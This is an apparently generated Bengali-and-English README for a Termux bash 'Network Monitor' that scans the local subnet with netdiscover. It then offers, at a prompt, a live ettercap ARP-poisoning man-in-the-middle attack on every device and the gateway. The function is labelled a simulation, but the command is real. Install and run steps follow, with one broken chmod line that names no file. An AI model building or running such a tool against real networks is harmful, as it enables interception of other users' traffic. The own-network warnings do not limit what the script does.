# Scan_monitor_tools

### স্ক্রিপ্ট ডিজাইন
এখানে আমি আপনার নির্দেশনা অনুযায়ী কোড টুকু তৈরি করেছি যা উল্লিখিত সকল ফিচার নিশ্চিত করবে। এখানে **`figlet`**, **`toilet`**, **`figlet`** টুলস ব্যবহার করে সুন্দর ও গ্রাফিক্যাল আউটপুট তৈরি করা হবে।

```bash
#!/data/data/com.termux/files/usr/bin/bash

# Color codes for better design and output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
NC='\033[0m' # No color

# Special light effect for design (Simple representation)
light_effect() {
    for i in {1..5}
    do
        echo -e "${CYAN}>>> Light Ray Effect: Active <<<${NC}"
        sleep 1
    done
}

# Header function with figlet & toilet for beautiful design
header() {
    clear
    figlet -f slant "Network Monitor" | toilet -f term --gay
    echo -e "${CYAN}-----------------------------------------------------${NC}"
    echo -e "${GREEN}    Real-time Network & MITM Tool (v1.0) ${NC}"
    echo -e "${CYAN}-----------------------------------------------------${NC}"
}

# Function to scan devices on the network
scan_devices() {
    echo -e "${YELLOW}Scanning for devices on the network...${NC}"
    netdiscover -r 192.168.1.0/24 -P > /data/data/com.termux/files/home/device_scan.txt
    echo -e "${GREEN}Device Scan Complete!${NC}"
}

# Function to display connected devices info
device_info() {
    echo -e "${YELLOW}Connected Devices:${NC}"
    cat /data/data/com.termux/files/home/device_scan.txt
}

# Function to simulate MITM attack (Just an example)
mitm_attack() {
    echo -e "${RED}Initiating MITM Attack...${NC}"
    echo -e "${YELLOW}Warning: Only run this on your own network for testing purposes.${NC}"
    ettercap -T -q -i wlan0 -M arp:remote /192.168.1.0/24// /192.168.1.1//
}

# Function to display logs and statistics
display_logs() {
    echo -e "${CYAN}Logs and Statistics:${NC}"
    echo -e "${GREEN}Total Devices Found: $(cat /data/data/com.termux/files/home/device_scan.txt | wc -l)${NC}"
    echo -e "${YELLOW}Device Details:${NC}"
    cat /data/data/com.termux/files/home/device_scan.txt
    echo
}

# Main function to run the network monitor with real-time updates
run_network_monitor() {
    while true
    do
        header
        scan_devices
        device_info
        display_logs
        
        # Calling light effect to give a visual feel of "light rays"
        light_effect
        
        read -p "Do you want to start MITM attack? (y/n): " choice
        if [ "$choice" == "y" ]; then
            mitm_attack
        fi
        
        echo -e "${CYAN}Waiting for next update...${NC}"
        sleep 60 # Update every 1 minute
    done
}

# Call the function to start the network monitor
run_network_monitor
```

### **স্ক্রিপ্ট ব্যাখ্যা:**

1. **Header & Beautiful Text Design:** প্রথমে `figlet` এবং `toilet` দিয়ে বড় সুন্দর টেক্সট ডিজাইন করা হয়েছে যাতে টুলসটি প্রফেশনাল মনে হয়। এটি সাধারণ ব্যবহারকারীর জন্য আকর্ষণীয় এবং গঠিত হবে।
  
2. **Device Scanning:** `netdiscover` ব্যবহার করা হয়েছে নেটওয়ার্কে কানেক্টেড ডিভাইসগুলির তথ্য পাওয়ার জন্য। স্ক্যান করার পর প্রতিটি ডিভাইসের IP ও MAC অ্যাড্রেস দেখানো হবে।

3. **MITM Attack Simulation:** আপনি যদি চান, তবে **`ettercap`** এর মাধ্যমে MITM আক্রমণ চালানো যাবে। তবে, এটা শুধুমাত্র আপনার নিজস্ব নেটওয়ার্কের জন্য নিরাপদ হতে হবে।

4. **Light Effect:** স্ক্রিপ্টের মধ্যে একটি সিম্পল লাইট রে ইফেক্ট তৈরি করা হয়েছে যাতে বিশেষ কিছু মুহূর্তে আপনার স্ক্রিপ্টটি আরো সুন্দরভাবে দেখা যায়। এই প্রভাবটি প্রতি মিনিটে আলাদা আলাদা সেকেন্ডে দেখানো হবে।

5. **Real-time Monitoring with Updates:** প্রতি ১ মিনিট পর পর নেটওয়ার্কের সমস্ত ডিভাইসের তথ্য আপডেট হবে এবং আপনাকে দেখানো হবে। আপনি যদি চান, MITM আক্রমণও শুরু করতে পারবেন।

### **ধাপ ১: স্ক্রিপ্ট তৈরি করুন**
```bash
pkg update
pkg upgrade -y
pkg install git -y
pkg install wget -y
pkg install curl -y
pkg install tcpdump -y
pkg install nmap -y
pkg install ettercap -y
pkg install figlet -y
pkg install toilet -y

```

### **ধাপ ২: স্ক্রিপ্ট রানযোগ্য করুন**
```bash
chmod +x 
```

### **ধাপ ৩: স্ক্রিপ্ট রান করুন**
```bash
./main.sh
```

### **আউটপুট উদাহরণ (প্রফেশনাল ডিজাইন):**
```
-----------------------------------------------------
    Real-time Network & MITM Tool (v1.0)
-----------------------------------------------------
Scanning for devices on the network...
Device Scan Complete!
Connected Devices:
IP: 192.168.1.2   MAC: 00:1A:2B:3C:4D:5E
IP: 192.168.1.3   MAC: 00:1A:2B:3C:4D:5F

Logs and Statistics:
Total Devices Found: 2
Device Details:
IP: 192.168.1.2   MAC: 00:1A:2B:3C:4D:5E
IP: 192.168.1.3   MAC: 00:1A:2B:3C:4D:5F

>>> Light Ray Effect: Active <<<

Do you want to start MITM attack? (y/n): y
Initiating MITM Attack...
Warning: Only run this on your own network for testing purposes.

Waiting for next update...
```

### **সতর্কতা:**
- **MITM Attack** এবং অন্যান্য নেটওয়ার্ক আক্রমণ শুধুমাত্র আপনার নিজের নেটওয়ার্কে এবং লিগ্যাল পরিসরে ব্যবহার করতে হবে। অন্যের নেটওয়ার্কে আক্রমণ করা বেআইনি এবং আইন ভঙ্গ করতে পারে।
  
এটি একটি শক্তিশালী এবং সুন্দর ডিজাইনের টুল, যা আপনার নেটওয়ার্কে কানেক্টেড ডিভাইসগুলো ট্র্যাক করে এবং MITM আক্রমণ করার ক্ষমতা প্রদান করবে।
